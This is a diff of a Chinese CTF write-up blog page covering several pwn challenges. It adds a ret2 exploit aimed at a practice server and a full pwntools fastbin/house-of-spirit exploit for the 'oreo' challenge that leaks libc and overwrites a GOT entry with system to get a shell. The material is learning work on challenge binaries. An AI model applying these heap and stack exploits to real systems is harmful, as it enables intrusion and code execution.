@@ -115,10 +115,21 @@
 <meta property="og:url" content="https://yuuoniy.github.io/2018/09/04/201809-writeups/index.html">
 <meta property="og:site_name" content="尿尿">
 <meta property="og:description" content="希望能坚持下去… 一天一道可能吗 可不可能自己说了算啦 别人都做得到 readme_revenge分析程序，首先读取name，之后输出，存在栈溢出漏洞?反编译有问题，还是看汇编比较好，虽然我汇编很弱orzfile strings checksec一波 静态链接python subprocess 模块flag 在 0x00006B4040首先输出junk，程序崩溃，地址0x000000000045">
-<meta property="og:updated_time" content="2018-09-11T09:22:05.629Z">
+<meta property="og:image" content="http://p6cwaqxnz.bkt.clouddn.com/oreo-1.png">
+<meta property="og:image" content="http://p6cwaqxnz.bkt.clouddn.com/oreo-layout.png?imageView2/2/w/400">
+<meta property="og:image" content="http://p6cwaqxnz.bkt.clouddn.com/oreo-order-layout.png?imageView2/2/w/400">
+<meta property="og:image" content="http://p6cwaqxnz.bkt.clouddn.com/oreo-overflow-1.png?imageView2/2/w/400">
+<meta property="og:image" content="http://p6cwaqxnz.bkt.clouddn.com/oreo-overflow-2.png?imageView2/2/w/400">
+<meta property="og:image" content="http://p6cwaqxnz.bkt.clouddn.com/oreo-leak-address.png?imageView2/2/w/400">
+<meta property="og:image" content="http://p6cwaqxnz.bkt.clouddn.com/oreo-fastbin-chain.png?imageView2/2/w/400">
+<meta property="og:image" content="http://p6cwaqxnz.bkt.clouddn.com/oreo-fake-chunk.png?imageView2/2/w/400">
+<meta property="og:image" content="http://p6cwaqxnz.bkt.clouddn.com/oreo-notice.png?imageView2/2/w/400">
+<meta property="og:image" content="http://p6cwaqxnz.bkt.clouddn.com/oreo-yeah.png">
+<meta property="og:updated_time" content="2018-09-15T12:31:37.976Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="201809-writeups">
 <meta name="twitter:description" content="希望能坚持下去… 一天一道可能吗 可不可能自己说了算啦 别人都做得到 readme_revenge分析程序，首先读取name，之后输出，存在栈溢出漏洞?反编译有问题，还是看汇编比较好，虽然我汇编很弱orzfile strings checksec一波 静态链接python subprocess 模块flag 在 0x00006B4040首先输出junk，程序崩溃，地址0x000000000045">
+<meta name="twitter:image" content="http://p6cwaqxnz.bkt.clouddn.com/oreo-1.png">
 
 
 
@@ -385,7 +396,7 @@
                 
                   <span class="post-meta-item-text">Edited on</span>
                 
-                <time title="Modified: 2018-09-11 17:22:05" itemprop="dateModified" datetime="2018-09-11T17:22:05+08:00">2018-09-11</time>
+                <time title="Modified: 2018-09-15 20:31:37" itemprop="dateModified" datetime="2018-09-15T20:31:37+08:00">2018-09-15</time>
               
             
           </span>
@@ -435,7 +446,7 @@
                 
                   <span class="post-meta-item-text">Symbols count in article: </span>
                 
-                <span title="Symbols count in article">8k</span>
+                <span title="Symbols count in article">11k</span>
               
 
               
@@ -449,7 +460,7 @@
                 
                   <span class="post-meta-item-text">Reading time &asymp;</span>
                 
-                <span title="Reading time">7 mins.</span>
+                <span title="Reading time">10 mins.</span>
               
             </div>
           
@@ -494,7 +505,7 @@
 </ol>
 <p><em><strong>printf_arginfo_table[spec-&gt;info.spec] 这里是怎么构造的..?<br>看取的地址相对于</strong>printf_arginfo_table 的偏移，就是spec-&gt;info.spec的值</em>8，而spec-&gt;info.spec为s，所以是Ord(s)<em>8<br>format s offset 为什么是  ord(“s”)</em>8?<br>注意ljust 不会修改原来的字符产,所以需要赋值!</p>
 <p>参考:<a href="https://github.com/r00ta/myWriteUps/tree/master/34C32017/pwn_readme_revenge" target="_blank" rel="external">https://github.com/r00ta/myWriteUps/tree/master/34C32017/pwn_readme_revenge</a></p>
-<h3 id="jarvisoj-guestbook"><a href="#jarvisoj-guestbook" class="headerlink" title="jarvisoj guestbook"></a>jarvisoj guestbook</h3><p>首先读取一长串字符串，过长会出现非法访问内存的错误<br>看到good game函数，会打开flag.txt，所以应该劫持控制流让程序执行good game 函数<br>覆盖返回地址为good game<br>签到题orz</p>
+<h3 id="jarvisoj-guestbook"><a href="#jarvisoj-guestbook" class="headerlink" title="jarvisoj guestbook"></a>jarvisoj guestbook</h3><p>首先读取一长串字符串，过长会出现非法访问内存的错误<br>看到good game函数，会打开flag.txt，所以应该劫持控制流让程序执行good game 函数<br>覆盖返回地址为 good game<br>签到题orz</p>
 <h3 id="jarvisoj-smashes"><a href="#jarvisoj-smashes" class="headerlink" title="jarvisoj smashes"></a>jarvisoj smashes</h3><p>利用__stack_chk_fail</p>
 <p>flag 在 0x000600D21<br>利用漏洞打印出flag<br>flag 上面有个变量，<br>IO_gets 有漏洞吧 栈溢出<br>_IO_getc<br>会overwriteflag 就是会修改原来的flag<br>SSP<br>将libc_argv[0] 的地址覆盖为flag地址<br>需要知道：</p>
 <ol>
@@ -503,12 +514,7 @@
 </ol>
 <p>使用search 程序名 查找<br>在 __IO_gets 后一句下断点，获得输入字符串的地址<br>覆盖前会映射到别的地方，可以search一下<br>构造好payload发过去就行了</p>
 <p><strong>ELF重映射：当可执行文件足够小时，在不同的区段可能被多次映射。</strong></p>
-<h3 id="jarvisoj-test-your-memory"><a href="#jarvisoj-test-your-memory" class="headerlink" title="jarvisoj test your memory"></a>jarvisoj test your memory</h3><p>首先分析一下程序 </p>
-<p>随机数<br>随机打印6个字符，输出<br>我们输入的字串要与随机生成的字串前四个字符相等??但是和hint中的cat flag有什么关系呢 </p>
-<p>data 段有个hint<br>漏洞在哪呢….<br>s 有栈溢出 scanf 会溢出吗</p>
-<p>直接覆盖返回地址为hint？？的地址???<br>win_fun 调用字符串</p>
-<p>很基础的 ret2libc</p>
-<p>080487E0 为 ‘cat flag’字符串<br>返回地址要设置为main函数的地址 </p>
+<h3 id="jarvisoj-test-your-memory"><a href="#jarvisoj-test-your-memory" class="headerlink" title="jarvisoj test your memory"></a>jarvisoj test your memory</h3><p>首先分析一下程序<br>签到题..<br>data 段有个hint<br><code>0x80487E0</code> 为 <code>cat flag</code>字符串<br>返回地址要设置为main函数的地址<br>payload:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"><span class="comment">#p = process("./memory")</span></div><div class="line">p = remote(<span class="string">"pwn2.jarvisoj.com"</span>,<span class="number">9876</span>)</div><div class="line">catflag_addr = <span class="number">0x80487E0</span></div><div class="line">sys_addr=<span class="number">0x80485BD</span></div><div class="line">payload=<span class="string">"a"</span>*(<span class="number">0x13</span>+<span class="number">4</span>)+p32(sys_addr)+p32(<span class="number">0x8048677</span>)+p32(catflag_addr)</div><div class="line">p.sendline(payload)</div><div class="line">p.interactive()</div></pre></td></tr></table></figure></p>
 <h3 id="level3-x64"><a href="#level3-x64" class="headerlink" title="level3 x64"></a>level3 x64</h3><p>很明显的栈溢出<br>但是怎么利用呢，给了libc ，所以应该是rop,自己找gadgets？<br>直接找one_gadget呢,还有熟悉一下x64 寄存器内容<br>one_gadget 命令都不记得orz<br>果然我都不熟啊!<br>搜索onegadgets<br>pwngdb 里面是可以直接是由rop命令搜索的，还算方便</p>
 <p>但是没有rdx的gadgets 呀，因为不知道libc的基址…也没法用libc的，我们的目的是使rdx&gt;=8，如果满足就可以不用管了，可以调一调看满不满足 </p>
 <p>X64使用寄存器传参 </p>
@@ -559,13 +565,50 @@
 <p>噢,realloc 函数的问题,之前没理解….<br>如果是扩大内存操作会把 ptr 指向的内存中的数据复制到新地址（新地址也可能会和原地址相同，但依旧不能对原指针进行任何操作）；如果是缩小内存操作，原始据会被复制并截取新长度。</p>
 <p>为什么会这样子打印呢..为什么以\x0a结尾? 是回车! 所以还有一个漏洞是没有以null结尾?<br>printf函数中的”%s”直到遇到内存中的’\0’标志时才会结束输出。<br>实在不明白为什么会输出那个地址。。</p>
 <p>unsorted bin 从头部插入，从尾部取出<br>offset 是怎么算出来来着??自己算了一下就好了…<br>学到了system(“$0”)</p>
-<h3 id="fastbin-attack-oreo"><a href="#fastbin-attack-oreo" class="headerlink" title="fastbin attack oreo"></a>fastbin attack oreo</h3><p>首先分析程序<br>没有delete 找不到洞怎么办orz<br>add:在head头部插入新的指针，<br>指针包含description,name,next,rifle信息<br>order,清空当前链表，指针清空不会置为null，double free 漏洞</p>
-<figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="selector-class">.bss</span><span class="selector-pseudo">:0804A288</span> <span class="selector-tag">head</span>            <span class="selector-tag">dd</span> ?                    ; <span class="selector-tag">DATA</span> <span class="selector-tag">XREF</span>: <span class="selector-tag">add</span>+11↑<span class="selector-tag">r</span></div><div class="line"><span class="selector-class">.bss</span><span class="selector-pseudo">:0804A288</span>                                         ; <span class="selector-tag">add</span>+25↑<span class="selector-tag">w</span> ...</div><div class="line"><span class="selector-class">.bss</span><span class="selector-pseudo">:0804A28C</span>                 <span class="selector-tag">align</span> 20<span class="selector-tag">h</span></div><div class="line"><span class="selector-class">.bss</span><span class="selector-pseudo">:0804A2A0</span> <span class="selector-tag">order_num</span>       <span class="selector-tag">dd</span> ?                    ; <span class="selector-tag">DATA</span> <span class="selector-tag">XREF</span>: <span class="selector-tag">order</span>+5<span class="selector-tag">A</span>↑<span class="selector-tag">r</span></div><div class="line"><span class="selector-class">.bss</span><span class="selector-pseudo">:0804A2A0</span>                                         ; <span class="selector-tag">order</span>+62↑<span class="selector-tag">w</span> ...</div><div class="line"><span class="selector-class">.bss</span><span class="selector-pseudo">:0804A2A4</span> <span class="selector-tag">rifle_cnt</span>       <span class="selector-tag">dd</span> ?                    ; <span class="selector-tag">DATA</span> <span class="selector-tag">XREF</span>: <span class="selector-tag">add</span>+<span class="selector-tag">C5</span>↑<span class="selector-tag">r</span></div><div class="line"><span class="selector-class">.bss</span><span class="selector-pseudo">:0804A2A4</span>                                         ; <span class="selector-tag">add</span>+<span class="selector-tag">CD</span>↑<span class="selector-tag">w</span> ...</div><div class="line"><span class="selector-class">.bss</span><span class="selector-pseudo">:0804A2A8</span> ; <span class="selector-tag">char</span> *<span class="selector-tag">notice</span></div><div class="line"><span class="selector-class">.bss</span><span class="selector-pseudo">:0804A2A8</span> <span class="selector-tag">notice</span></div></pre></td></tr></table></figure>
-<p>没法调试怎么办??<br>Symbol ‘main arena’ not found. Try installing libc debugging symbols and try again.<br>怎么办..<br>有堆溢出..其实没有做过堆溢出的题目<br>为什么需要设置Number 为0x40？因为要伪造fastbin chunk</p>
-<p>house of spirit<br>（1）伪造堆块<br>在可控1及可控2构造好数据，将它伪造成一个fastbin。</p>
-<p>（2）覆盖堆指针指向上一步伪造的堆块。</p>
+<h3 id="fastbin-attack-oreo"><a href="#fastbin-attack-oreo" class="headerlink" title="fastbin attack oreo"></a>fastbin attack oreo</h3><p>利用这道题练习一下fastbin<br>首先分析程序的函数</p>
+<p><strong>add</strong><br>在head头部插入新的rifle结构体指针<br>rifle 结构体：</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">00000000 rifle           struc ; (sizeof=0x38, mappedto_5)</div><div class="line">00000000 descript        db 25 dup(?)</div><div class="line">00000019 name            db 27 dup(?)</div><div class="line">00000034 next            dd ?                    ; offset</div><div class="line">00000038 rifle           ends</div></pre></td></tr></table></figure>
+<p>可以看到读取name和descript时都是0x38,溢出了。<br><img src="http://p6cwaqxnz.bkt.clouddn.com/oreo-1.png" alt="1"></p>
+<p><strong>show_rifles</strong><br>输出每个rifle的name</p>
+<p><strong>order</strong><br>清空链表，free 掉申请的块，从head 开始free,但是没有置为null，因此有漏洞。order_num+1</p>
+<p><strong>message</strong><br>读取0x80 字串</p>
+<p><strong>show_stats</strong><br>输出当前的信息</p>
+<p>整理一下，程序申请的块都是0x38，fastbin,有double free漏洞。可以利用fastbin attack</p>
+<p>看一下bss段数据的布局:<br><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="selector-class">.bss</span><span class="selector-pseudo">:0804A288</span> <span class="selector-tag">head</span>            <span class="selector-tag">dd</span> ?                    ; <span class="selector-tag">DATA</span> <span class="selector-tag">XREF</span>: <span class="selector-tag">add</span>+11↑<span class="selector-tag">r</span></div><div class="line"><span class="selector-class">.bss</span><span class="selector-pseudo">:0804A288</span>                                         ; <span class="selector-tag">add</span>+25↑<span class="selector-tag">w</span> ...</div><div class="line"><span class="selector-class">.bss</span><span class="selector-pseudo">:0804A28C</span>                 <span class="selector-tag">align</span> 20<span class="selector-tag">h</span></div><div class="line"><span class="selector-class">.bss</span><span class="selector-pseudo">:0804A2A0</span> <span class="selector-tag">order_num</span>       <span class="selector-tag">dd</span> ?                    ; <span class="selector-tag">DATA</span> <span class="selector-tag">XREF</span>: <span class="selector-tag">order</span>+5<span class="selector-tag">A</span>↑<span class="selector-tag">r</span></div><div class="line"><span class="selector-class">.bss</span><span class="selector-pseudo">:0804A2A0</span>                                         ; <span class="selector-tag">order</span>+62↑<span class="selector-tag">w</span> ...</div><div class="line"><span class="selector-class">.bss</span><span class="selector-pseudo">:0804A2A4</span> <span class="selector-tag">rifle_cnt</span>       <span class="selector-tag">dd</span> ?                    ; <span class="selector-tag">DATA</span> <span class="selector-tag">XREF</span>: <span class="selector-tag">add</span>+<span class="selector-tag">C5</span>↑<span class="selector-tag">r</span></div><div class="line"><span class="selector-class">.bss</span><span class="selector-pseudo">:0804A2A4</span>                                         ; <span class="selector-tag">add</span>+<span class="selector-tag">CD</span>↑<span class="selector-tag">w</span> ...</div><div class="line"><span class="selector-class">.bss</span><span class="selector-pseudo">:0804A2A8</span> ; <span class="selector-tag">char</span> *<span class="selector-tag">notice</span></div><div class="line"><span class="selector-class">.bss</span><span class="selector-pseudo">:0804A2A8</span> <span class="selector-tag">notice</span></div></pre></td></tr></table></figure></p>
+<p>Symbol ‘main arena’ not found. Try installing libc debugging symbols and try again.<br>怎么办..</p>
+<p>首先申请两个块，查看信息：</p>
+<p>布局是这样的：(借网上的图)<br><img src="http://p6cwaqxnz.bkt.clouddn.com/oreo-layout.png?imageView2/2/w/400" alt=""></p>
+<p>再看order后：  </p>
+<p><img src="http://p6cwaqxnz.bkt.clouddn.com/oreo-order-layout.png?imageView2/2/w/400" alt="">  </p>
+<p>先free b,再free a。fastbin 从头部插入，所以a的fd指向chunk b，而chunk b的fd 为 null</p>
+<p>再来分析一下，程序读取时有溢出，可以覆盖整个块。即我们可以伪造next 指针，并且可以覆盖到下一个块的内容。 </p>
+<p><img src="http://p6cwaqxnz.bkt.clouddn.com/oreo-overflow-1.png?imageView2/2/w/400" alt="">  </p>
+<p><img src="http://p6cwaqxnz.bkt.clouddn.com/oreo-overflow-2.png?imageView2/2/w/400" alt=""></p>
+<p>利用：<br><strong>地址泄露</strong><br>利用溢出，使next指向我们想要泄露内容的地址，再通过show，达到了地址泄露<br><img src="http://p6cwaqxnz.bkt.clouddn.com/oreo-leak-address.png?imageView2/2/w/400" alt=""><br><strong>fastbin attack</strong><br>构造fake chunk:<br>可以在<code>0x804A2A0</code>处构造，对应的size为<code>rifle_cn</code>t，可以通过<code>add</code>多次使它的值为0x41,满足要求<br>构造chunk 2的fd 指向fake chunk地址：<br><img src="http://p6cwaqxnz.bkt.clouddn.com/oreo-fastbin-chain.png?imageView2/2/w/400" alt=""></p>
+<p>fake chunk 结构：<br><img src="http://p6cwaqxnz.bkt.clouddn.com/oreo-fake-chunk.png?imageView2/2/w/400" alt=""></p>
+<p>因此整个利用过程为：</p>
+<ol>
+<li>泄露libc基址，得到system函数地址</li>
+<li>添加<code>0x3f</code>个块</li>
+<li>释放掉这些块</li>
+<li>申请新的块，如上图构造<code>fastbin chain</code>,此时申请新的块为第一次申请的<code>chunk 1</code></li>
+<li>构造<code>chunk 1</code>的内容，覆盖<code>chunk 2</code>的fd 指针为<code>0x804A2A0</code></li>
+<li>构造好<code>0x804A2A0</code>中的内容，将 notice 指向 free 的 got</li>
+<li>此时 rifle_cnt 刚好为0x41 ，申请 chunk ,此时会将 ·0x804A2A0· 分配出去，</li>
+<li>通过<code>message</code> 函数修改<code>strlen got</code>为<code>system</code> message 内容 system 地址+”;sh\x00”</li>
+<li><code>get shell</code></li>
+</ol>
+<p>最后相当于调用 <code>system(&quot;\x??\x??\x??;sh&quot;)</code> 很巧妙 0.0<br>head 指针指向notice<br><img src="http://p6cwaqxnz.bkt.clouddn.com/oreo-notice.png?imageView2/2/w/400" alt=""></p>
+<p>getshell:<br><img src="http://p6cwaqxnz.bkt.clouddn.com/oreo-yeah.png" alt=""></p>
+<p>本地libc地址 直接<code>vmmap</code>就看到了。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"><span class="keyword">if</span> args[<span class="string">'DEBUG'</span>]:</div><div class="line">    context.log_level = <span class="string">'debug'</span></div><div class="line">context.binary = <span class="string">"./oreo"</span></div><div class="line">oreo = ELF(<span class="string">"./oreo"</span>)</div><div class="line"><span class="keyword">if</span> args[<span class="string">'REMOTE'</span>]:</div><div class="line">    p = remote(ip, port)</div><div class="line"><span class="keyword">else</span>:</div><div class="line">    p = process(<span class="string">"./oreo"</span>)</div><div class="line">log.info(<span class="string">'PID: '</span> + str(proc.pidof(p)[<span class="number">0</span>]))</div><div class="line"><span class="comment">#libc = ELF('./libc.so.6')</span></div><div class="line">libc=ELF(<span class="string">'/lib/i386-linux-gnu/libc-2.24.so'</span>)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(name, descrip)</span>:</span></div><div class="line">    p.sendline(<span class="string">'1'</span>)</div><div class="line">    p.sendline(name)</div><div class="line">    p.sendline(descrip)</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_rifle</span><span class="params">()</span>:</span></div><div class="line">    p.sendline(<span class="string">'2'</span>)</div><div class="line">    p.recvuntil(<span class="string">'===================================\n'</span>)</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">order</span><span class="params">()</span>:</span></div><div class="line">    p.sendline(<span class="string">'3'</span>)</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">message</span><span class="params">(notice)</span>:</span></div><div class="line">    p.sendline(<span class="string">'4'</span>)</div><div class="line">    p.recvuntil(<span class="string">"Enter any notice you'd like to submit with your order: "</span>)</div><div class="line">    p.sendline(notice)</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></div><div class="line">    name = <span class="number">27</span> * <span class="string">'a'</span> + p32(oreo.got[<span class="string">'puts'</span>])</div><div class="line">    add(name, <span class="string">'b'</span>)</div><div class="line">    show_rifle()</div><div class="line">    p.recvuntil(<span class="string">'===================================\n'</span>)</div><div class="line">    p.recvuntil(<span class="string">'Description: '</span>)</div><div class="line">    puts_addr = u32(p.recvuntil(<span class="string">'\n'</span>, drop=<span class="keyword">True</span>)[:<span class="number">4</span>])</div><div class="line">    log.success(<span class="string">'puts addr: '</span> + hex(puts_addr))</div><div class="line">    libc_base = puts_addr - libc.symbols[<span class="string">'puts'</span>]</div><div class="line">    system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</div><div class="line">    log.success(hex(system_addr))</div><div class="line">    oifle = <span class="number">1</span></div><div class="line">    <span class="keyword">while</span> oifle &lt; <span class="number">0x3f</span>:</div><div class="line">        add(<span class="string">'a'</span> * <span class="number">27</span> + p32(<span class="number">0</span>),<span class="string">'b'</span>)</div><div class="line">        oifle += <span class="number">1</span></div><div class="line">    add(<span class="string">"a"</span>,<span class="string">"b"</span>)</div><div class="line">    order()</div><div class="line">    add(<span class="string">'a'</span> * <span class="number">27</span> + p32(<span class="number">0</span>)+p32(<span class="number">0</span>)+p32(<span class="number">0x41</span>)+p32(<span class="number">0x0804a2a8</span><span class="number">-8</span>),<span class="string">'b'</span>)</div><div class="line">    add(<span class="string">'a'</span>,<span class="string">'b'</span>)</div><div class="line">    add(<span class="string">"a"</span>,p32(oreo.got[<span class="string">'strlen'</span>]))</div><div class="line">    gdb.attach(p)</div><div class="line">    message(p32(system_addr)+<span class="string">";sh\x00"</span>)</div><div class="line">    p.interactive()</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</div><div class="line">    exp()</div></pre></td></tr></table></figure></p>
+<h4 id="house-of-spirit"><a href="#house-of-spirit" class="headerlink" title="house of spirit"></a>house of spirit</h4><p>（1）伪造堆块<br>在可控1及可控2构造好数据，将它伪造成一个fastbin。</p>
+<p>（2）覆盖堆指针指向上一步伪造的堆块。(覆盖哪里的堆指针)</p>
 <p>（3）释放堆块，将伪造的堆块释放入fastbin的单链表里面。</p>
-<p>（4）申请堆块，将刚刚释放的堆块申请出来，最终使得可以往目标区域中写入数据，实现目的。<br><a href="https://www.slideshare.net/YOKARO-MON/oreo-hacklu-ctf-2014-65771717" target="_blank" rel="external">https://www.slideshare.net/YOKARO-MON/oreo-hacklu-ctf-2014-65771717</a><br><a href="https://blog.betamao.me/2018/02/25/hack-lu-ctf-2014-oreo/" target="_blank" rel="external">https://blog.betamao.me/2018/02/25/hack-lu-ctf-2014-oreo/</a></p>
+<p>（4）申请堆块，将刚刚释放的堆块申请出来，最终使得可以往目标区域中写入数据，实现目的。<br>参考链接：<br><a href="https://www.slideshare.net/YOKARO-MON/oreo-hacklu-ctf-2014-65771717" target="_blank" rel="external">https://www.slideshare.net/YOKARO-MON/oreo-hacklu-ctf-2014-65771717</a><br><a href="https://blog.betamao.me/2018/02/25/hack-lu-ctf-2014-oreo/" target="_blank" rel="external">https://blog.betamao.me/2018/02/25/hack-lu-ctf-2014-oreo/</a></p>
+<h3 id="0ctf-2017-babyheap"><a href="#0ctf-2017-babyheap" class="headerlink" title="0ctf 2017 babyheap"></a>0ctf 2017 babyheap</h3><p>算是很经典的一道题了吧<br>好好理一遍：<br>先分析一下程序<br>保护全开,怎么利用呢…<br><strong>allocate</strong>:<br>最大0x1000<br>chunk 包含三个字段：size,inuse,ptr<br>head 是chunk* 类型。<br>calloc 分配会把内存都置为0，与malloc不同。</p>
+<p><strong>fill</strong><br>没有设置字符串结尾，而且长度并不是之前 chunk 分配时指定的长度，是自己指定的，所以这里就出现了任意堆溢出的情形。可以用来泄露libc地址，以及构造fake chunk</p>
+<p><strong>show</strong><br>输出对应chunk的内容</p>
+<p><strong>利用思路</strong> </p>
 
       
     </div>
@@ -689,7 +732,7 @@
                 
                   <a href="/archives/">
                 
-                    <span class="site-state-item-count">62</span>
+                    <span class="site-state-item-count">66</span>
                     <span class="site-state-item-name">posts</span>
                   </a>
                 </div>
@@ -824,7 +867,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#readme-revenge"><span class="nav-number">1.</span> <span class="nav-text">readme_revenge</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#fortify-fail函数"><span class="nav-number">1.1.</span> <span class="nav-text">__fortify_fail函数</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#jarvisoj-guestbook"><span class="nav-number">2.</span> <span class="nav-text">jarvisoj guestbook</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#jarvisoj-smashes"><span class="nav-number">3.</span> <span class="nav-text">jarvisoj smashes</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#jarvisoj-test-your-memory"><span class="nav-number">4.</span> <span class="nav-text">jarvisoj test your memory</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level3-x64"><span class="nav-number">5.</span> <span class="nav-text">level3 x64</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level5"><span class="nav-number">6.</span> <span class="nav-text">level5</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level4"><span class="nav-number">7.</span> <span class="nav-text">level4</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#借助dynELF实现无libc的漏洞利用"><span class="nav-number">7.1.</span> <span class="nav-text">借助dynELF实现无libc的漏洞利用</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#jarivsoj-level6"><span class="nav-number">8.</span> <span class="nav-text">jarivsoj level6</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#guestbook-2"><span class="nav-number">9.</span> <span class="nav-text">guestbook 2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#fastbin-attack-oreo"><span class="nav-number">10.</span> <span class="nav-text">fastbin attack oreo</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#readme-revenge"><span class="nav-number">1.</span> <span class="nav-text">readme_revenge</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#fortify-fail函数"><span class="nav-number">1.1.</span> <span class="nav-text">__fortify_fail函数</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#jarvisoj-guestbook"><span class="nav-number">2.</span> <span class="nav-text">jarvisoj guestbook</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#jarvisoj-smashes"><span class="nav-number">3.</span> <span class="nav-text">jarvisoj smashes</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#jarvisoj-test-your-memory"><span class="nav-number">4.</span> <span class="nav-text">jarvisoj test your memory</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level3-x64"><span class="nav-number">5.</span> <span class="nav-text">level3 x64</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level5"><span class="nav-number">6.</span> <span class="nav-text">level5</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level4"><span class="nav-number">7.</span> <span class="nav-text">level4</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#借助dynELF实现无libc的漏洞利用"><span class="nav-number">7.1.</span> <span class="nav-text">借助dynELF实现无libc的漏洞利用</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#jarivsoj-level6"><span class="nav-number">8.</span> <span class="nav-text">jarivsoj level6</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#guestbook-2"><span class="nav-number">9.</span> <span class="nav-text">guestbook 2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#fastbin-attack-oreo"><span class="nav-number">10.</span> <span class="nav-text">fastbin attack oreo</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#house-of-spirit"><span class="nav-number">10.1.</span> <span class="nav-text">house of spirit</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0ctf-2017-babyheap"><span class="nav-number">11.</span> <span class="nav-text">0ctf 2017 babyheap</span></a></li></ol></div>
             
 
           </div>
@@ -858,7 +901,7 @@
       <i class="fa fa-area-chart"></i>
     </span>
     
-    <span title="Symbols count total">82k</span>
+    <span title="Symbols count total">88k</span>
   
 
   
@@ -867,7 +910,7 @@
       <i class="fa fa-coffee"></i>
     </span>
     
-    <span title="Reading time total">1:14</span>
+    <span title="Reading time total">1:20</span>
   
 </div>
 
